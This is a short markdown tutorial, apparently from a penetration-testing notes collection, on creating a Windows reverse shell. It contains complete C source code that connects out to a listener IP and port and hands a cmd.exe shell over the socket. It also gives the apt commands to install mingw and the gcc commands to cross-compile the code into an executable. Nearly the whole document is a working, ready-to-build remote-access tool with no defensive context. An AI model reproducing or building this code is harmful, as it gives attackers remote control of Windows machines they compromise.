# Shells creation

Install mingw on linux
```sudo apt install mingw-w64```
```sudo apt install gcc-mingw-w64```

Download the Cwindows(not c shell code) shell code filetype: **(CWindows)** from [revsehlls.com](https://www.revshells.com/) and save it to a file windows.c than run below command it will generate a reverse shell
##### c reverse shell code(Just replace IP & Port)

```
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "listenerip"; 
char port[6] = "listnerport";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}
```

### X86 compilation
```i686-w64-mingw32-gcc-win32 -std=c99 windows.c -o rsh.exe -lws2_32```
### X64 compilation(it might show warning but its exe file works)
```x86_64-w64-mingw32-gcc -std=c99 windows.c -o rsh.exe -lws2_32```

#### -l this option is used to statically link binaries or else its going to produce an error here we are statically linking lws2_32 dll file
